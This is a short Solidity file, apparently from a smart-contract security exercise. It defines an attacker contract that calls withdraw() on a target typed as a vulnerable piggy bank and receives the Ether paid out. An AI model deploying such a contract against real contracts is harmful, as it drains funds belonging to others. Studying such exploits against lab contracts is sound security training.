// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerablePiggyBank {
    function withdraw() external;
}

contract AttackPiggyBank {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        IVulnerablePiggyBank(target).withdraw();
    }

    receive() external payable {}
}
